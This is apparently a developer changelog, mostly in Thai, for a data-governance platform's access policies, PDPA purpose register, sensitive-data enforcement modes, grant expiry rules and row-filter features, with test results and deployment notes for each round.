- `DataPolicyBuilder` — kind *Column is one of the values a mapping table gives them* · ช่อง Column / Value column / Mapping table · key ทีละแถว (Add a key / Remove key N · เหลือตัวสุดท้ายลบไม่ได้) · Select *The mapping is*: **Join it into the query** / **Read the values first** พร้อมคำอธิบายข้อจำกัด · เปลี่ยนเป็น kind อื่น → ทิ้ง `lookup` · เปลี่ยนมา LOOKUP → ทิ้ง `columns` (เลือก column ได้ตามชื่ออย่างเดียว ดูข้างล่าง)
- `policyLanguage.describeRowFilter` · `SimulatorPage.describePredicate` (บอก mapping + ค่า key ของคนนั้น **ไม่บอกค่าที่ mapping ให้**) · `enforcement.ts` เตือนใน capability matrix ว่า secure view / native ไม่รองรับ
- docs: `user-guide.md` (*Rows given by a mapping table*) · `policy-spec.md` (6 kinds) · DESIGN FR-4.1

**test** — backend unit ผ่านทั้ง reactor 1,282 (ใหม่ `LookupRowFilterTest` 7 · `LookupBinderTest` 10 · เพิ่มเคส LOOKUP ใน `DecisionSqlRowFilterTest` · `ViewCompilerTest` · `RowEntitlementMaintainerTest`) · IT ใหม่ `LookupRowFilterIT` 15 บน Postgres จริง (join / read-first เห็นแค่ division ที่ map · mapping เปลี่ยนมีผลทันที · ไม่มี department เห็น 0 · ค่าที่มี quote เป็นแค่ค่า · join ข้าม source ปฏิเสธ · read ข้าม source ได้ · source ของ mapping ถูกปิด / ไม่อยู่ใน catalog ปฏิเสธ · > 1,000 ค่าปฏิเสธแต่ join ผ่าน · char pad match · timestamp ไม่ถูก list · decision ที่ cache ไม่ถูกแก้ · save-time check) · jest 852 ผ่าน · type-check สะอาด · lint: error เฉพาะ `shot-*.mjs` ที่ไม่ได้ commit

**ยังไม่ทำ / ข้อควรรู้**
- ~~LOOKUP เลือก column ด้วย tag ไม่ได้~~ → ทำแล้วในข้อ CU
- prod: deploy 2026-09-30 ที่ `45cad24` · V45 ลงแล้ว · smoke 17/17 (LOOKUP ถูกปฏิเสธถูกต้อง 4 เคส · จำนวน policy ไม่เปลี่ยน · grants / purposes 200 · ไม่ POST grant)
- mapping หลายทอด (department → division → region) ให้ทำเป็น view แล้ว map บน view
- ตัวพิมพ์ใหญ่เล็กตาม collation ของ column (citext / SQL Server CI ไม่สนตัวพิมพ์)
- secure view / native ไม่รองรับ — enforce ผ่าน query API เท่านั้น

## รอบก่อนหน้า — **ข้อ CS: grant เก็บ purpose และอายุไม่เกินของ purpose (M31b slice 2a · FR-21)**

ต่อจาก DESIGN FR-21 *"grant เก็บ `purpose_id` และมีอายุไม่เกินของ purpose"* — ก่อนหน้านี้คำขอสิทธิ์เก็บ purpose แต่พอ owner กด complete แล้ว grant ที่ได้ไม่รู้ว่าให้ไปเพื่ออะไร และ grant ที่ owner ให้ตรงไม่มีช่อง purpose เลย ระยะสิทธิ์สูงสุดของ purpose จึงบังคับได้แค่ตอนขอ

**DB** — V45 `grant_access.purpose` (text · nullable) · เก็บ key ของทะเบียน หรือคำเดิมของ template ที่มีก่อนทะเบียน · อ่านผ่าน history ของ grant ด้วย (revoke / amend เป็น tombstone เหมือนเดิม)

**กติกา (ตรวจใน `GrantStore` ที่เดียว ตาม `Origin`)**
- `DIRECT` (ให้ตรงจาก tab Access) — ไม่ใส่ก็ได้ · ใส่แล้วต้องอยู่ในทะเบียนและยังใช้อยู่ (ไม่อยู่ / ถูกปลด → 400)
- `REQUEST` (complete คำขอ) — ใช้คำที่คำขอเก็บไว้ · ไม่อยู่ในทะเบียนผ่านได้ (template เก่ามีคำของตัวเอง) · ถูกปลดหลังส่งคำขอ → ปฏิเสธ · `AccessRequestStore.complete` แปลงเป็น `INVALID` ทั้งก้อน คำขอยังอยู่ที่ `APPROVED` ไม่มี grant ถูกสร้าง
- `EDIT` (แก้ grant) — คง purpose เดิม · ถูกปลดไปแล้วก็ยังแก้ได้ (แก้วันที่ของ grant เก่าได้โดยไม่ติดสิ่งที่คนแก้ไม่ได้ก่อ) แต่ระยะสูงสุดยังบังคับ
- purpose มี `maxDays` → grant ต้องมีวันจบ · จบไม่เกิน `maxDays` วัน + 10 นาที นับจากวันเริ่ม (แก้ grant = นับจากวันเริ่มเดิม ยืดออกไปเรื่อยๆ ไม่ได้) · ระยะถูกลดหลังส่งคำขอ → complete ด้วยระยะเดิมไม่ได้ ต้องย่อ

**API** — `GrantRequest.purpose` (POST grant) · `purpose` ใน `GrantAccess` / grant ที่เก็บ / history entry

**frontend**
- `GrantDialog` — ช่อง *What for* (`PurposeSelect` เฉพาะตัวที่ใช้อยู่) · เลือก purpose ที่มีระยะสูงสุด → ชิป *No expiry* / ระยะที่ยาวกว่าหายไป · วันถูกตัดด้วย `fitDays` · โหมดวันที่บอกเหตุผลก่อนส่ง (*lasts at most N days; end it by …* / *give the grant an end*) · ปุ่ม Grant ปิดจนกว่าจะพอดี
- `AccessTab` — badge ชื่อ purpose ข้าง grant · รายละเอียดมี **Purpose** + ฐานกฎหมาย หรือ *None named* · ค้นด้วย purpose ได้ (`accessLists.filterGrants`)

**test** — backend unit ผ่านทั้ง reactor · IT ใหม่ `GrantCompositionIT.Purposes` 5 (เก็บ key · ไม่ใส่ · ไม่อยู่ในทะเบียน → ปฏิเสธ · ระยะเกิน → ปฏิเสธ · แก้แล้วคง purpose) · `AccessRequestIT.Purposes` +4 (grant คง purpose ของคำขอ · ระยะถูกลดหลังขอ · ถูกปลดหลังขอ · คำเดิมของ template ผ่าน) · IT ของ GrantCompositionIT + AccessRequestIT ผ่านทั้งหมด 129 (Testcontainers) · jest ทั้งหมด 848 ผ่าน (`GrantDialog.test` +6 · `AccessTab.test` +1 · `accessLists.test` +1) · type-check สะอาด · lint: error มีเฉพาะไฟล์ scratch `shot-*.mjs` ที่ไม่ได้ commit

**ยังไม่ทำ (slice 2b)** — รายงาน *"ข้อมูล PII ถูกใช้เพื่ออะไร"* บน Dashboard จาก `audit_decision.sensitive` · ปลด purpose แล้วส่ง grant เข้ารอบทบทวน (ต้องมี M32)

## รอบก่อนหน้า — **ข้อ CR: ติด label `integration` ที่ PR ที่เปิดอยู่แล้ว CI รัน Integration ทันที**

ตอน merge CP / CQ เจอว่า Integration (Testcontainers) ขึ้น *skipped* ทั้งที่ติด label `integration` แล้ว — `ci.yml` ฟัง `pull_request` แค่ type ค่าเริ่มต้น (opened / synchronize / reopened) การติด label หลังเปิด PR จึงไม่สั่งรันใหม่ ต้องปิด-เปิด PR หรือ push commit ใหม่ ขณะที่ CONTRIBUTING.md บอกว่าติด label แล้วจะรัน

**แก้** — `pull_request: types: [opened, synchronize, reopened, labeled]` · ติด label ใดก็ตามจะรัน CI ทั้งชุดใหม่ (concurrency ยกเลิกรอบที่ค้าง) ไม่ได้กรองเฉพาะ label `integration` เพราะถ้า job อื่น skip ในรอบที่มายกเลิกรอบเดิม required check จะดูเหมือนผ่านทั้งที่ไม่ได้รัน

**ตรวจเพิ่ม (อ่านอย่างเดียว)** — เงื่อนไข `in` / `notIn` / `ne` ใน policy ที่เก็บอยู่ทั้งหมดไม่มีตัวไหนความหมายเปลี่ยนจากข้อ CP: `in` / `notIn` ใช้ `values` ครบทุกตัว · `ne` มีค่าให้เทียบทุกตัว

## รอบก่อนหน้า — **ข้อ CQ: Row filter เลือก column ด้วย tag ได้ (Column tagged)**

ผู้ใช้ถาม *"ทำไม Column ไม่มีให้เลือก Column tag เวลา scope column ใน data policy"* — ช่อง Column ของ row filter (Which rows they see) เป็นชื่อ column ตายตัวชื่อเดียว ขณะที่ column rule เลือกด้วย tag ได้อยู่แล้ว · policy เดียวจึงใช้กับตารางที่ตั้งชื่อ column สาขาต่างกันไม่ได้

**spec** — `dataPolicy.json` `rowFilter.columns` (assetSelector) ใช้กับ `ATTRIBUTE_COMPARE` / `IN_LIST` เท่านั้น · ใช้แทน `column` ไม่ใช่ใช้คู่กัน

**engine** — `PolicyEngine.filteredColumns` resolve selector กับ `asset.columns()` ตอนตัดสินใจ (`SelectorMatcher.matches`)
- ไม่มี column ไหน match → `ALWAYS_FALSE` พร้อมเหตุผล *no column of this table matches it* (fail-closed ไม่ใช่ปล่อยทุกแถว)
- match หลาย column → predicate ต่อ column แล้ว AND กัน (ไม่เดาว่าผู้เขียนหมายถึงตัวไหน)
- compiler / proxy / AccessReview ไม่ต้องแก้ เพราะได้ `ResolvedRowPredicate` ที่มีชื่อ column จริงอยู่แล้ว
- tag ของตารางไม่ตกทอดลง column (ตาม FacetInheritance) → นับเฉพาะ tag ที่ติดที่ column เอง

**server** — `ConditionValues.rowFilterColumn` ปฏิเสธ (400): selector บน kind อื่น · มีทั้ง `column` และ `columns` · selector ว่าง · ค่าใน selector ว่าง/ผิดรูป (ตามกติกาข้อ CP)

**frontend**
- `DataPolicyBuilder` `RowFilterRow` — Select *Pick the column by*: **Column named** (ช่องพิมพ์เดิม) / **Column tagged** (`SelectorBuilder subject="column"` + vocabulary) · เปลี่ยน kind เป็นแบบที่ไม่เทียบ column แล้วทิ้ง `columns` · hint บอกกรณีไม่มี / มีหลาย column
- `conditionValues.normaliseConditionValues` normalise selector ของ row filter ด้วย
- `policyLanguage.describeRowFilter` — *only rows where the column (tag under Org.Branch) …*

**test** — backend unit ผ่านทั้ง reactor (`PolicyEngineTest` +3: 2 ตารางชื่อ column ต่างกัน · ไม่มี column → ALWAYS_FALSE · 2 column → 2 predicate · `ConditionValuesTest` +4) · jest `DataPolicyBuilder.test` ใหม่ 3 · `conditionValues.test` +1 · `policyLanguage.test` +1 · IT ไม่ได้รัน (Docker ไม่ขึ้น)

**พฤติกรรมเดิมไม่เปลี่ยน** — policy ที่ใช้ `column` ตามชื่ออยู่แล้วทำงานเหมือนเดิมทุกอย่าง

## รอบก่อนหน้า — **ข้อ CP: "is one of" ใส่ได้หลายค่า (และบั๊ก fail-open ของ "is none of") · subscription เลือกระดับ Organisation ได้**

ผู้ใช้ถาม *"attribute ยังไม่มี or เลย"* แล้วถามต่อ *"หน้าจอไม่เห็นมีให้ใส่หลายอันเลย is one of"* และสั่ง *"เปิดระดับ Org หน่อย เพราะยังไงเรา Filter asset ได้ ในข้อนี้อยู่แล้ว Which assets it covers"*

**คำตอบเรื่อง or** — attribute ต่อกันด้วย AND ตั้งใจ (ตรงกับ `SubjectMatcher`) · OR ภายใน key เดียวใช้ *is one of* · OR ข้าม key เขียนใน expression ด้วย `||` · hint บนฟอร์มบอกแล้ว

**บั๊กที่เจอระหว่างดู (ความปลอดภัย)** — editor เขียนสิ่งที่พิมพ์ลง `value` เสมอ แต่ engine อ่าน `in` / `notIn` จาก `values` → *is one of* "FINANCE, RISK" ไม่ match ใครเลย และ **_is none of_ match ทุกคน (fail-open)** · *is not* ที่ว่างก็ match ทุกคนเช่นกัน

**engine** — `Operators`
- `IN` / `NOT_IN` อ่านจาก `listOf(value, values)` · policy เก่าที่เก็บ list เป็น string เดียวถูกแยกที่จุลภาค (อ่านได้ตามที่ผู้เขียนตั้งใจ ไม่ต้อง migrate)
- `NOT_IN` ที่ list ว่าง = false · `NE` ที่ไม่มีค่า = false (fail-closed)

**server** — `policy/ConditionValues.check` (เรียกจาก `PolicyStore.validate` ทั้ง create / update / rollback)
- ไล่ selector (and / or / not) · `data.columnRules[].columns` · `subject.attributes`
- `in` / `notIn` ไม่มี `values` → 400 · มี `value` ที่ไม่ว่างอยู่ข้าง `values` → 400 (*would be ignored*) · operator อื่น (ยกเว้น exists / notExists) ที่ไม่มีค่า → 400
- rollback ไป version ที่เป็นรูปแบบเก่า → ปฏิเสธพร้อมข้อความ *Version N can no longer be saved as it is: …*

**frontend**
- `policies/conditionValues.ts` — `isListOperator` · `splitValues` · `listOf` · `withOperator` (เปลี่ยน operator แล้วย้ายค่าไปช่องที่ถูก · ออกจาก list เก็บตัวแรก ไม่ join) · `normaliseConditionValues` (เรียกตอน save ทุกครั้ง ทำให้ policy เก่าที่เปิดแล้วกด Save เฉยๆ ผ่าน server)
- `controls.tsx` `ValueList` — ชิปทีละค่า: พิมพ์แล้ว **Enter** หรือ **จุลภาค** · × ลบ · Backspace ในช่องว่างลบตัวสุดท้าย · ไม่รับค่าซ้ำ · datalist เดิมยังใช้ได้
- ใช้ใน `SelectorBuilder` (Which assets it covers + column rules) และ `SubjectBuilder` (attributes)
- `PolicyBuilderPage` — `SUBSCRIPTION_LEVELS = ['ORG', 'TABLE']` · hint ของ ORG: *Every asset step 3 selects, on every source. With nothing selected it covers nothing.* · **อัปเดต (ข้อ CV):** `SUBSCRIPTION_LEVELS` ถูกลบแล้ว subscription เลือกได้ทุกระดับ

**test** — backend unit ผ่านทั้ง reactor (`SelectorMatcherTest` 13 · `SubjectMatcherTest` 15 · `ConditionValuesTest` 7 ใหม่) · jest **836 ผ่าน / 84 suites** (`conditionValues.test` · `SelectorBuilder.test` ใหม่ · `SubjectBuilder.test` +3 · `PolicyBuilderPage.test` +2: เมนู Level มี Organisation / Table เท่านั้น · policy เก่ากด Save แล้วส่ง `values`) · type-check · lint (ไฟล์ที่ track) ผ่าน · IT ไม่ได้รัน (Docker ไม่ขึ้น)

**พฤติกรรมที่เปลี่ยนหลัง deploy (ต้องบอก maintainer)** — policy ที่ใช้ *is one of* แบบเก่าจะเริ่ม match ค่าที่ระบุจริง · *is none of* จะเลิก match ทุกคน · *is not* ที่ว่างจะไม่ match ใคร · ควรไล่ดู policy ACTIVE ที่ใช้ `in` / `notIn` / `ne` บน prod ก่อนหรือหลัง deploy ทันที

## รอบก่อนหน้า — **ข้อ CO: อะไรนับเป็นข้อมูลอ่อนไหว + Off / Warn / Enforce (M31b slice 1 · FR-21 · PDPA ม.26)**

ผู้ใช้ถาม *"ต้องมี ที่ Configure ไหม"* หลัง M31a → เสนอให้ตั้งได้ใน Settings → Purposes (รายการรวม / ยกเว้น · กติกา built-in เปิดไว้ · วัดก่อน save · แก้ได้ admin + POLICY_AUTHOR พร้อมประวัติ · mode Off / **Warn (default)** / Enforce) → ผู้ใช้ตอบ "ต่อ"

**ทำไม** — "sensitive" เคยเป็นกติกาที่เขียนใน code ที่ AccessReview (ชื่อ PII / PersonalData / tag ที่ชื่อบอก sensitive …) · `sensitiveAllowed` ของ purpose บันทึกไว้เฉยๆ ไม่มีผล · องค์กรที่ใช้ชื่อ classification อื่น (เช่น `Confidential.Customer`) หรือใช้ glossary term ตั้งไม่ได้เลย

**backend**
- **Flyway V44** `sensitive_data_rule` (แถวเดียว `id = 1`) — `built_in` true · `include` / `exclude` jsonb `[{kind, fqn}]` (CLASSIFICATION · TAG · GLOSSARY · TERM) · `mode` OFF / WARN / ENFORCE (default **WARN**) · `updated_by` / `updated_at` · `audit_sensitive_data_rule` append-only (actor · reason · before / after · แถวแรกเป็น system) · `audit_decision` เพิ่ม `sensitive boolean` + `purpose_check` (`WARNED` / `REFUSED`) + partial index
- `purpose/SensitiveData` — `Rule.labels(...)` (label ที่ specific สุด · exclude ชนะ include · built-in ใช้กับ classification / tag เท่านั้น · นับเฉพาะ `Confirmed`) · `current()` cache 10 วินาที (แก้ในเครื่องนี้เห็นทันที) · `update(settings, reason, actor)` เขียน audit ใน transaction เดียวกัน · `coverage(rule)` (ตาราง / column ที่ครอบ · ตัวอย่าง ≤ 50 · ต่อ label ≤ 30) · `concern(handle, table, purpose)` / `judge(...)` — purpose ไม่ได้ `sensitive_allowed` · ไม่อยู่ในทะเบียน · หรือไม่ได้ระบุ บนตาราง sensitive → `Concern{mode, table, labels, purpose, purposeName, message}`
- ข้อความ: *"{table} holds sensitive data ({labels}), and {Purpose} is not a purpose sensitive data may be used for. Choose one that is, or ask a policy author to allow it under Settings, Purposes"* · ไม่ระบุ purpose: *"…, and no purpose was named. Name one that sensitive data may be used for"*
- `QueryService` — ตัดสินหลัง policy เท่านั้น (ตารางที่ policy ปฏิเสธไม่ถูกตัดสินเรื่อง purpose) · WARN → รัน · `warnings[]` ในผล (`QueryResource` ส่งออก) · ENFORCE → ปฏิเสธ · `deniedAsset` null (ไม่เปิดฟอร์มขอสิทธิ์ เพราะไม่ใช่เรื่องสิทธิ์) · `audit_decision.sensitive` (OFF = null) + `purpose_check`
- `QueryRefusals` หมวดใหม่ `PURPOSE_NOT_ALLOWED` (Query log · Dashboard *Purpose not for sensitive data*) · `AuditResource` ให้ owner เห็นเหตุผลของหมวดนี้เมื่อพูดถึงตารางของตัวเอง (เหมือน POLICY_DENY)
- `AccessRequestStore` — ENFORCE → ปฏิเสธคำขอก่อนเก็บ (ข้อความเดียวกับ proxy) · Pre-authorize ไม่ตรวจ · `AccessReview` — ใช้กติกาเดียวกันบอกว่า column ไหน sensitive + factor `PURPOSE_NOT_FOR_SENSITIVE` (WARN = MEDIUM · ENFORCE = HIGH) · `AssistPrompts` (คำอธิบายหมวด refusal ให้ NokRak ตอนอธิบาย dashboard) รู้จักหมวดใหม่
- `resources/SensitiveDataResource` `/v1/sensitive-data`: `GET` (ทุกคนที่ login + `canEdit`) · `PUT` (admin / POLICY_AUTHOR · เหตุผลบังคับ ≤ ความยาวเดียวกับ purpose · label ไม่มีชนิด / ไม่มีชื่อ / อยู่ทั้งสองรายการ / เกิน 100 ต่อรายการ / ชื่อเกิน 256 หรือมี control char / ไม่มีอะไรเปลี่ยน → 400 · ตัดช่องว่างและตัดตัวซ้ำให้) · `POST /preview` (null = กติกาที่ใช้อยู่ · หรือร่าง) + `GET /history` (admin / author / DATA_OWNER / AUDITOR) · `GET /check?asset=&purpose=` (ทุกคนที่ login)
- **ยังไม่ครอบ**: Decision API (`POST /v1/decisions`) และ Simulator ยังไม่ตรวจเรื่องนี้

**frontend**
- `api/sensitiveData.ts` — type · `useSensitiveData` · `usePurposeConcerns(assets, purpose)` (หน่วง 300 ms · ถามทีละตาราง · cache 30 วินาที) · `ruleProblem` / `sameSettings` / `describeChange`
- `pages/settings/SensitiveDataSection.tsx` ใต้ Settings → Purposes — *What counts as sensitive data*: badge mode · built-in · Also counts / Never counts · เตือน *Nothing counts as sensitive* · **Measure coverage** · **History** (ประโยค เช่น *enforce instead of warn; Finance (classification) counted*) · **Edit** (ชนิด + ชื่อจาก vocabulary · radio mode · เตือนก่อน Enforce · **Measure what it covers** กับร่าง · Why บังคับ · *Nothing has changed yet*)
- `pages/requests/PurposeConcerns.tsx` — WARN = note สีเหลือง *You can still ask; whoever decides is told.* · ENFORCE = alert สีแดง *A request for it would be refused.* · `refusedBy` → ปุ่มส่งปิด *Choose a purpose sensitive data may be used for*
- `RequestAccess` (จากหน้า Query) + `NewRequestPage` (หลายตาราง — ถามทุกตารางที่จะส่ง) ใช้ `PurposeConcerns` ใต้ purpose · หน้า Query แสดง `warnings` เหนือผล (`role=status` *Sensitive data*) · `api/audit.ts` label หมวดใหม่

**test**
- backend: `SensitiveDataTest` 10 · `SensitiveDataResourceTest` 8 · `QueryRefusalsTest` · `AccessReviewTest` เพิ่ม → unit **1353 ผ่าน** · IT ใหม่ `SensitiveDataIT` 7 · `SensitiveQueryIT` 7 (Postgres จริง: WARN รันพร้อม warning + audit · ไม่ระบุ purpose บอกว่าไม่ได้ระบุ · ENFORCE ปฏิเสธก่อนอ่าน source บอกชื่อ purpose ไม่เสนอฟอร์มขอ · purpose ที่อนุญาตผ่านแม้ ENFORCE · ตารางไม่ sensitive ไม่ถูกเตือน · OFF = sensitive null · policy-denied ไม่ถูกถามเรื่อง purpose) · `AccessRequestIT.Sensitive` 4 · regression `AccessRequestIT` ทั้งหมด · `QueryLogIT` · `QueryLimitsIT` · `QueryResultCacheIT` · `PurposeStoreIT` · `DashboardIT` ผ่าน
- jest: `SensitiveDataSection.test` 8 · `RequestAccess.test` +2 (warn ยังส่งได้ · enforce ปิดปุ่มจนเลือก purpose ที่อนุญาต) · `NewRequestPage.test` +1 (ถามทุกตาราง · enforce ตัวเดียวก็ไม่ส่ง) · `PurposesPage.test` mock section → **820 ผ่าน / 82 suites** · tsc · vite build ผ่าน

**พฤติกรรมที่ตั้งใจเปลี่ยน** — AccessReview เคยนับ label ที่ specific สุดด้วยกติกาใน code อย่างเดียว · ตอนนี้นับตาม setting (default = กติกาเดิม ผลเท่าเดิม) และอ่าน classification / glossary ด้วย · `Suggested` ยังไม่นับ

**prod** — V44 ขึ้นพร้อม default = built-in + WARN (ไม่มีใครถูกปฏิเสธเพิ่ม) · smoke test อ่านอย่างเดียว (GET rule · preview · check) · **ไม่เปลี่ยน mode หรือรายการบน prod** — ให้ admin / policy author วัด coverage แล้วตัดสินเอง

**ต่อไป (M31b slice 2)** — grant เก็บ `purpose` + อายุไม่เกิน `max_days` · Dashboard *"ข้อมูล PII ถูกใช้เพื่ออะไร"* จาก `audit_decision.sensitive` + purpose · Decision API / Simulator ตรวจเรื่องเดียวกัน · ปลด purpose → grant เข้ารอบทบทวน (ต้องมี M32)

## รอบก่อนหน้า — **ข้อ CN: Purpose register (M31a · FR-21)**

ผู้ใช้สั่ง "ทำต่อ" หลังแนะนำ M31 เป็นตัวแรกของชุด M31–M36 · แบ่งเป็น **M31a** (ทะเบียน + picker + ตรวจที่ server — รอบนี้) และ **M31b** (grant · รายงาน · บังคับข้อมูลอ่อนไหว)

**ทำไม** — purpose เคยเป็นคำพิมพ์เอง 4 ที่ (`subject.context.purpose` ของ policy · `form.purposes` ของ template · ช่องในฟอร์มขอ · กล่องในหน้า Query) · ไม่มีอะไรบอกว่าสองคำเป็นเรื่องเดียวกัน หรือกฎหมายให้ใช้เพื่ออะไร

**backend**
- **Flyway V43** `purpose` (key · name · description · legal_basis · sensitive_allowed · owner · max_days 1–365 · status ACTIVE / RETIRED · created / updated by+at) · unique `lower(key)` และ `lower(name)` · `audit_purpose` append-only (CREATE / UPDATE / RETIRE / REINSTATE · reason · before / after jsonb) · seed `fraud-analysis` · `reporting` · `support` (สามตัวที่หน้า Query เคยมี · ฐานกฎหมายเว้นว่าง)
- key regex `^[a-z0-9][a-z0-9._-]{0,62}$` (เก็บตัวเล็ก ให้ตรงกับที่ engine เทียบแบบไม่สนตัวพิมพ์) · แก้ key ไม่ได้ · ลบไม่ได้ ปลดแทน
- ฐานกฎหมาย: `CONSENT` · `CONTRACT` · `LEGAL_OBLIGATION` · `VITAL_INTEREST` · `PUBLIC_TASK` · `LEGITIMATE_INTEREST` · `RESEARCH_OR_STATISTICS` หรือ null
- `purpose/PurposeStore` — list · find · create / update / retire / reinstate (เขียน audit ใน transaction เดียวกัน) · `usage()` นับ policy ที่ไม่ archived · template · คำขอที่ยังเปิด · `audit_decision` 90 วัน (รวมคำที่ไม่อยู่ในทะเบียน → *Named but not listed*) · `history(key)`
  - `declared(raw)` — Query (`run` / `export`) และ Decision / Simulator: ไม่อยู่ในทะเบียนหรือถูกปลด → 400 · คืน key ตามที่ทะเบียนสะกด
  - `requireListed(values, grandfathered, where)` — policy (`subject.context.purpose` ทุก rule) และ template (`form.purposes`) ต้องอ้างตัวที่ยังใช้อยู่ · **ค่าที่ของชิ้นนั้นมีอยู่แล้วผ่าน** (แก้ของเก่าได้โดยไม่ติดสิ่งที่คนแก้ไม่ได้ก่อ)
- `AccessRequestStore.listedPurpose` — ทุกเส้นทางของคำขอ (ฟอร์ม · จากหน้า Query · Pre-authorize): ปลดแล้ว → ปฏิเสธ · purpose มี `max_days` → วันเกินหรือไม่ใส่วัน (until revoked) → *Access for {name} lasts at most {N} days* (+ *; choose a number of days*) · template มีรายการ → ต้องอยู่ในรายการ (ไม่อยู่ในทะเบียนแต่อยู่ในรายการของ template ยังใช้ได้)
- `resources/PurposeResource` `/v1/purposes`: `GET` (ทุกคนที่ login · `canEdit`) · `GET /usage` + `GET /{key}/history` (admin · POLICY_AUTHOR · DATA_OWNER · AUDITOR) · `POST` · `PUT /{key}` · `POST /{key}/retire` · `POST /{key}/reinstate` (admin · POLICY_AUTHOR · retire / reinstate ต้องมีเหตุผล) · ชื่อซ้ำ / key ซ้ำ → 409

**frontend**
- `api/purposes.ts` (hook + type + ป้ายฐานกฎหมายพร้อมมาตรา) · `pages/policies/purposePickers.tsx` — `PurposeSelect` · `PurposeChecklist` · `RequestPurpose` · `PurposeLabel` · `PurposeName` · `cappedBy` / `fitDays` / `purposeDaysProblem` (ข้อความเดียวกับ server)
- **Settings → Purposes** (`PurposesPage.tsx` · route `/settings/purposes`) — In use · Named but not listed (+ **List it** เติมชื่อและ key ให้) · Retired · New / Edit (key แก้ได้เฉพาะตอนสร้าง) · Retire / Reinstate พร้อมเหตุผล · History (อ่านเป็นประโยค เช่น *changed the name, the longest access*) · คนที่ไม่มีสิทธิ์ดู usage ไม่ยิง `/usage` เลย
- picker: SubjectBuilder (ติ๊กจากทะเบียน · ค่าเดิมที่ไม่อยู่ในทะเบียนยังเห็น) · Request templates · ฟอร์มขอ 3 ที่ (RequestAccess จากหน้า Query · New request · Pre-authorize) · Query · Simulator
- ฟอร์มขอ: template มีรายการ → เลือกได้เฉพาะรายการนั้น (ชื่อตามทะเบียน · ซ่อนตัวที่ถูกปลด) · ไม่มีรายการ → เลือกจากทะเบียน (*No particular purpose* ได้ ถ้า template ไม่บังคับ) · ไม่มีทะเบียน → แบบเดิม · purpose มีระยะสูงสุด → ตัดตัวเลือกวันที่ยาวกว่า + *Until revoked* และดึงวันลงมา · Pre-authorize เลือกตัวเลือกที่ยาวที่สุดที่ไม่เกิน
- Requests: badge ในรายการใช้ชื่อ (`PurposeName`) · หน้ารายละเอียดแสดงชื่อ + ฐานกฎหมาย + ป้าย Sensitive / Retired (`PurposeLabel`)

**test**
- backend: `PurposeResourceTest` · `DeclaredPurposeTest` · `PolicyPurposeTest` · `RequestTemplateResourceTest` เพิ่ม · IT `purpose/PurposeStoreIT` + `AccessRequestIT` เพิ่ม → unit **792 ผ่าน** · IT ที่เกี่ยวผ่าน
- jest: `purposePickers.test` 12 · `PurposesPage.test` 12 · `RequestAccess` / `NewRequestPage` / `PreauthorizePage` / `RequestTemplatesPage` เพิ่ม · `SubjectBuilder.test` mock ทะเบียน (PurposeChecklist ต้องใช้ query) → **809 ผ่าน / 81 suites**

**ยังไม่ทำ (M31b)**
- grant เก็บ purpose และอายุไม่เกิน `max_days` ของ purpose (วันนี้บังคับที่คำขอ ไม่ใช่ที่ grant ที่ owner ให้ตรงๆ)
- รายงาน *"ข้อมูล PII ถูกใช้เพื่ออะไรบ้าง"* บน Dashboard
- บังคับ `sensitive_allowed` (ม.26) กับตารางที่ติดป้ายข้อมูลอ่อนไหว — ✅ ข้อ CO
- ปลด purpose → grant ที่อ้างอยู่เข้ารอบทบทวน (ต้องมี M32)
- บน prod **ไม่ได้สร้างหรือปลด purpose ทดสอบ** — ทะเบียนมีแค่ 3 ตัวจาก seed · ฐานกฎหมายให้เจ้าของข้อมูลใส่เอง

## รอบก่อนหน้า — **ข้อ CM: เลือก column ให้ NokRak ร่าง description · roadmap M31–M36 · Find data บอกจำนวนตารางที่เข้าไม่ถึง**

ผู้ใช้ขอ *"อยากให้สามารถเลือก gen Column description ได้เฉพาะบาง Column"* · ระหว่างทำขอให้ใส่ object ที่ควรเก็บเพิ่มลง roadmap (AP.17 · DESIGN FR-21 – FR-26 · M31–M36)

**ทำไมเป็นงานฝั่งหน้าจออย่างเดียว** — `POST /v1/llm/assist/describe-columns` รับรายชื่อ column อะไรก็ได้อยู่แล้ว (ไม่เกิน 40 ต่อครั้ง · ต้อง govern table · feature `DESCRIBE_COLUMNS`) และส่งคำอธิบายเดิมให้โมเดลเป็นบริบท · ที่ล็อกไว้ให้ร่างแต่ column ว่างคือหน้าจอเอง

**หน้าจอ (`ColumnsTab.tsx`)**
- ตอนกด **Describe columns** และมี NokRak: ทุกแถวมีช่องติ๊ก `Pick <column> for NokRak` · หัวตารางมีช่อง `Pick every column shown` ติ๊กเฉพาะแถวที่เห็นอยู่ (ใช้ร่วมกับช่องค้นหาหรือ *Only columns nobody has described*) และขึ้นขีดครึ่งเมื่อเลือกบางแถว
- ติ๊กแล้วปุ่มเป็น **Draft N picked with NokRak** + ลิงก์ **Clear picks** · ไม่ติ๊กเลย = ร่างเฉพาะ column ว่างเหมือนเดิม · ส่งตามลำดับของ table ไม่ใช่ลำดับที่คลิก · ยังแบ่งทีละ 40
- column ที่มีคำอธิบายแล้วก็ติ๊กได้ (เช่น เขียนใหม่เป็นภาษาไทย) — ร่างใหม่ลงฟอร์ม ของที่ save ไว้ยังอยู่จนกด Save · Save ลง `assisted: true`
- **กติกาใหม่ของการเติม**: ร่างเข้าช่องได้ก็ต่อเมื่อช่องยังเป็นค่าเดียวกับตอนกด Draft — พิมพ์อะไรระหว่างรอ ของคนชนะเสมอ (แทนกติกาเดิม "ช่องยังว่าง" ซึ่งใช้กับ column ที่มีคำอธิบายไม่ได้) · ร่างที่ว่าง (โมเดลบอกไม่รู้) **ไม่ลบ**ของเดิม · ข้อความแจ้งบอกจำนวนช่องที่เก็บของที่คนพิมพ์ไว้ (`N you had typed in meanwhile kept what you wrote`)
- ติ๊กไม่ได้ระหว่างร่างหรือระหว่าง save · Cancel / Save / เริ่มแก้ใหม่ ล้างที่ติ๊กไว้

**Test** — `ColumnsTab.test.tsx` +3 (ร่างเฉพาะที่ติ๊กรวม column ที่มีคำอธิบาย และ save เป็น assisted · ของที่พิมพ์ระหว่างรอชนะ + ร่างว่างไม่ลบ · ติ๊กทั้งหมดที่เห็น / indeterminate / Clear picks) + test เดิมเช็คว่าไม่มีช่องติ๊กเมื่อ NokRak ไม่พร้อม · ส่วนนี้ backend ไม่เปลี่ยน

**NokRak ตอบ "ไม่พบตาราง" ทั้งที่ตารางมีอยู่** — ผู้ใช้ถามแชทบน prod ว่ามีตารางเรื่องการจัดซื้อ / *"purchase order"* ไหม แล้วได้ "ไม่พบตารางที่อ่านได้หรือขอสิทธิ์ได้"
